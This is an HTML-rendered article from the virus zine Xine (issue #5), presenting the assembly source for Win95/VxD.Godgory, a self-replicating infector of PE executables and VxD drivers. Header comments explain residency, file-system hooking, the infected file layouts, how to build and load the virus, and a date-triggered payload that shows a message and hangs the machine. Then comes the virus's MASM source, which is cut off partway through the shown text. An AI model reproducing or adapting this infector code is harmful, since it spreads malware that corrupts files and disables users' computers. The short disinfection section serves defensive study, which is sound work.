<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;                                              ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;                                              ³ Xine - issue #5 - Phile 208 ³</span><span class="sc0">
</span><span class="sc1">;                                              ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">; ³ Win95/VxD.Godgory ³</span><span class="sc0">
</span><span class="sc1">; ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   Here's a multipartite PE EXE and VxD infector.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">; ³ 1. Virus analysis ³</span><span class="sc0">
</span><span class="sc1">; ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   When the virus receives execution control, it makes its residency check,</span><span class="sc0">
</span><span class="sc1">; goes resident (if necessary) and installs the required VxD hooks. Then, it</span><span class="sc0">
</span><span class="sc1">; activates the payload if the current date matches the one of the payload and</span><span class="sc0">
</span><span class="sc1">; returns execution to the host's DDB control procedure/original entrypoint.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">; ³ 1.1. Residency ³</span><span class="sc0">
</span><span class="sc1">; ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   To go resident, the virus calls _HeapAllocate.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">; ³ 1.2. VxD hooks ³</span><span class="sc0">
</span><span class="sc1">; ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   The "Test_Debug_Installed" hook handles the residency check whereas the</span><span class="sc0">
</span><span class="sc1">; file hook handles the infection of VxD and PE files.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">; ³ 1.3. Payload ³</span><span class="sc0">
</span><span class="sc1">; ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   The virus decrypts and displays the following string:</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; "Win95/VxD.Godgory, Horned Beast/VADER"</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">; ³ 1.4.1. File map: VxD ³</span><span class="sc0">
</span><span class="sc1">; ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;     Before infection           After infection</span><span class="sc0">
</span><span class="sc1">; ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿   ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">; ³                      ³   ³                      ³</span><span class="sc0">
</span><span class="sc1">; ³       VxD data       ³   ³       VxD data       ³</span><span class="sc0">
</span><span class="sc1">; ³                      ³   ³      (modified)      ³</span><span class="sc0">
</span><span class="sc1">; ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´   ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´</span><span class="sc0">
</span><span class="sc1">; ³   Enum data pages    ³   ³   Enum data pages    ³</span><span class="sc0">
</span><span class="sc1">; ³                      ³   ³                      ³</span><span class="sc0">
</span><span class="sc1">; ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´   ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´</span><span class="sc0">
</span><span class="sc1">; ³  Non-resident data   ³   ³  Non-resident data   ³</span><span class="sc0">
</span><span class="sc1">; ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ   ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´</span><span class="sc0">
</span><span class="sc1">;                            ³     Virus object     ³</span><span class="sc0">
</span><span class="sc1">;                            ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Or:</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;     Before infection           After infection</span><span class="sc0">
</span><span class="sc1">; ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿   ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">; ³                      ³   ³                      ³</span><span class="sc0">
</span><span class="sc1">; ³       VxD data       ³   ³       VxD data       ³</span><span class="sc0">
</span><span class="sc1">; ³                      ³   ³      (modified)      ³</span><span class="sc0">
</span><span class="sc1">; ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´   ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´</span><span class="sc0">
</span><span class="sc1">; ³   Enum data pages    ³   ³   Enum data pages    ³</span><span class="sc0">
</span><span class="sc1">; ³                      ³   ³                      ³</span><span class="sc0">
</span><span class="sc1">; ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´   ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´</span><span class="sc0">
</span><span class="sc1">; ³  Non-resident data   ³   ³     Virus object     ³</span><span class="sc0">
</span><span class="sc1">; ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ   ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´</span><span class="sc0">
</span><span class="sc1">;                            ³  Non-resident data   ³</span><span class="sc0">
</span><span class="sc1">;                            ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">; ³ 1.4.2. File map: PE ³</span><span class="sc0">
</span><span class="sc1">; ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;     Before infection           After infection</span><span class="sc0">
</span><span class="sc1">; ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿   ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">; ³                      ³   ³                      ³</span><span class="sc0">
</span><span class="sc1">; ³       PE data        ³   ³       PE data        ³</span><span class="sc0">
</span><span class="sc1">; ³                      ³   ³      (modified)      ³</span><span class="sc0">
</span><span class="sc1">; ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´   ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´</span><span class="sc0">
</span><span class="sc1">; ³     Last section     ³   ³     Last section     ³</span><span class="sc0">
</span><span class="sc1">; ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ   ³     +Virus code      ³</span><span class="sc0">
</span><span class="sc1">;                            ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">; ³ 2. Assembling and compiling ³</span><span class="sc0">
</span><span class="sc1">; ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Compile it to a VXD file, using:</span><span class="sc0">
</span><span class="sc1">; nmake /A</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; ÚÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">; ³ 3. Loading ³</span><span class="sc0">
</span><span class="sc1">; ÀÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   Register the virus VxD in the SYSTEM.INI file and restart Windows. The vi-</span><span class="sc0">
</span><span class="sc1">; rus will then stay resident and infect any accessed files.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">; ³ 4. Disinfection ³</span><span class="sc0">
</span><span class="sc1">; ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   To disinfect PE files, fix the last section header and the image size.</span><span class="sc0">
</span><span class="sc1">; Then, restore the pointer to the original entrypoint and reduce the file si-</span><span class="sc0">
</span><span class="sc1">; ze by Virus_Physical_Size bytes. Disinfection of VxD files is very complex</span><span class="sc0">
</span><span class="sc1">; due to the exhaustive LE header manipulation. The remaining alternative met-</span><span class="sc0">
</span><span class="sc1">; hod is to make the virus inactive. One way of doing this is to force the</span><span class="sc0">
</span><span class="sc1">; conditional jump from the residency check.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´ Start of file: GODGORY.ASM ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
                </span><span class="sc2">.386p</span><span class="sc0">

</span><span class="sc5">MASM</span><span class="sc0">            </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc1">;Needed for IFS.INC</span><span class="sc0">

                </span><span class="sc9">.XList</span><span class="sc0">
                </span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">VMM.INC</span><span class="sc0">
                </span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">IFS.INC</span><span class="sc0">
                </span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">IFSMGR.INC</span><span class="sc0">
                </span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">SHELL.INC</span><span class="sc0">
                </span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">MZ.INC</span><span class="sc0">
                </span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">LE.INC</span><span class="sc0">
                </span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">PE_MASM.INC</span><span class="sc0">
                </span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">SEH.INC</span><span class="sc0">
                </span><span class="sc9">.List</span><span class="sc0">

                </span><span class="sc9">public</span><span class="sc0">  </span><span class="sc5">GODGORY_DDB</span><span class="sc0">

</span><span class="sc5">Virus_Physical_Size</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc5">Virus_Physical_End</span><span class="sc4">-</span><span class="sc5">Virus_Start</span><span class="sc0">
</span><span class="sc5">Virus_Virtual_Size</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">    </span><span class="sc5">Virus_Virtual_End</span><span class="sc4">-</span><span class="sc5">Virus_Start</span><span class="sc0">
</span><span class="sc5">Virus_Sign</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc12">'Horn'</span><span class="sc0">
</span><span class="sc5">HB_Sign</span><span class="sc0">         </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc12">'HB'</span><span class="sc0"> </span><span class="sc1">;"Horned Beast"</span><span class="sc0">
</span><span class="sc5">Min_Page_Size</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">100h</span><span class="sc0">
</span><span class="sc5">Max_Page_Size</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">8000h</span><span class="sc0">
</span><span class="sc5">Payload_Day</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">Payload_Month</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">7</span><span class="sc0">
</span><span class="sc5">VMM_DDB_Address</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">0c000e980h</span><span class="sc0">

</span><span class="sc5">VxD_CODE_SEG</span><span class="sc0">

</span><span class="sc5">Return_Control</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">clc</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">GODGORY_DDB</span><span class="sc0">     </span><span class="sc5">VxD_Desc_Block</span><span class="sc0"> </span><span class="sc4">&lt;,,,,,,</span><span class="sc3">"GODGORY"</span><span class="sc4">,,</span><span class="sc5">Godgory_Control</span><span class="sc4">&gt;</span><span class="sc0">

</span><span class="sc1">;Simulate host execution</span><span class="sc0">
                </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc5">$.</span><span class="sc4">(</span><span class="sc5">DDB_Reserved3</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">)-(</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">VxD_Desc_Block</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">Godgory_Control</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Virus_Start</span><span class="sc0">

                </span><span class="sc5">Dword_Align</span><span class="sc0">

</span><span class="sc5">Virus_Start</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pushad</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+(</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">Pushad_Struc</span><span class="sc4">)]</span><span class="sc0"> </span><span class="sc1">;Return address</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">Godgory_Control</span><span class="sc4">-</span><span class="sc5">Return_Control</span><span class="sc0">
</span><span class="sc5">Host_Relocation</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,(</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">VxD_Desc_Block</span><span class="sc4">)-(</span><span class="sc5">DDB_Reserved3</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+(</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">Pushad_Struc</span><span class="sc4">)],</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc1">;Fix return address</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">INIT_COMPLETE</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">Message_OK</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">SYS_DYNAMIC_DEVICE_INIT</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">Return_to_Host</span><span class="sc0">
</span><span class="sc5">Message_OK</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Fix jump to DDB control procedure</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.</span><span class="sc4">(</span><span class="sc5">DDB_Reserved3</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">)-(</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">VxD_Desc_Block</span><span class="sc4">)]</span><span class="sc0"> </span><span class="sc1">;Call-&gt;jmp</span><span class="sc0">
                </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.DDB_Reserved3</span><span class="sc4">-(</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">VxD_Desc_Block</span><span class="sc4">)],</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc5">Go_Resident</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Start_Delta</span><span class="sc0">
</span><span class="sc5">Start_Delta</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Fix_Dynamic_Links</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">Virus_Sign</span><span class="sc0">
</span><span class="sc5">Dynamic_Link1</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc5">VMMCall</span><span class="sc0"> </span><span class="sc5">Test_Debug_Installed</span><span class="sc0"> </span><span class="sc1">;Residency check</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">Return_to_Host</span><span class="sc0"> </span><span class="sc1">;Already resident</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">Virus_Virtual_Size</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">My_HeapAllocate</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">Return_to_Host</span><span class="sc0"> </span><span class="sc1">;No memory</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+(</span><span class="sc5">Virus_Start</span><span class="sc4">-</span><span class="sc5">Start_Delta</span><span class="sc4">)]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,(</span><span class="sc5">Virus_Physical_Size</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsd</span><span class="sc0"> </span><span class="sc1">;Copy virus</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc1">;Install hooks</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+(</span><span class="sc5">Debug_Hook</span><span class="sc4">-</span><span class="sc5">Virus_Start</span><span class="sc4">)]</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+(</span><span class="sc5">Old_Debug</span><span class="sc4">-</span><span class="sc5">Debug_Hook</span><span class="sc4">)]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-(</span><span class="sc5">Debug_Hook</span><span class="sc4">-</span><span class="sc5">Old_Debug_Pointer</span><span class="sc4">)],</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc5">GetVxDServiceOrdinal</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">Test_Debug_Installed</span><span class="sc0">
</span><span class="sc5">Dynamic_Link2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc5">VMMCall</span><span class="sc0"> </span><span class="sc5">Hook_Device_Service</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+(</span><span class="sc5">Disable_Hook</span><span class="sc4">-</span><span class="sc5">Virus_Start</span><span class="sc4">)],</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+(</span><span class="sc5">File_Hook</span><span class="sc4">-</span><span class="sc5">Virus_Start</span><span class="sc4">)]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">Dynamic_Link5</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">IFSMgr_InstallFileSystemApiHook</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+(</span><span class="sc5">Old_File</span><span class="sc4">-</span><span class="sc5">Virus_Start</span><span class="sc4">)],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc1">;The payload</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">
                </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">70h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">71h</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">Payload_Day</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">Return_to_Host</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
                </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">70h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">71h</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">Payload_Month</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">Return_to_Host</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+(</span><span class="sc5">Virus_Name</span><span class="sc4">-</span><span class="sc5">Virus_Start</span><span class="sc4">)]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc5">Decrypt_Name</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">66h</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">Decrypt_Name</span><span class="sc0">
                </span><span class="sc5">VMMCall</span><span class="sc0"> </span><span class="sc5">Get_Sys_VM_Handle</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">;Message box flags</span><span class="sc0">
                </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">SHELL_SYSMODAL_Message</span><span class="sc0"> </span><span class="sc1">;Display virus name</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc1">;Hang execution</span><span class="sc0">
</span><span class="sc5">Return_to_Host</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">popad</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;Simulate a HOOK_PROC</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Debug_Hook</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Old_Debug</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">Old_Debug_Pointer</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">Debug_Hook</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pushfd</span><span class="sc0">
